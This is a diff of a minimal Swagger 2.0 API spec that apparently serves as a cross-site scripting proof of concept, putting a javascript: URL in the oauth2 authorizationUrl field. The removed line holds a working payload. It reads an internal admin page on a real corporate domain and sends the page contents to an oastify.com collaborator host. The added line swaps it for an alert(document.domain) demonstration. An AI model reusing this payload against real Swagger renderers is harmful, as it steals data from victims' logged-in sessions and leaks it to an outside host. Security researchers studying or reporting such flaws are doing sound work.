@@ -1,8 +1,9 @@
+
 swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: javascript:fetch('https://mymessage-corp.apple.com/mmadmin/').then(a=> a.text()).then(a=> fetch('https://xdeh3n7ovyvxv7fp161q0qpgk7qxem.oastify.com?x='+a))//
+    authorizationUrl: javascript:alert(document.domain)//
 info:
   version: "0.0.1"
   title: Example Title
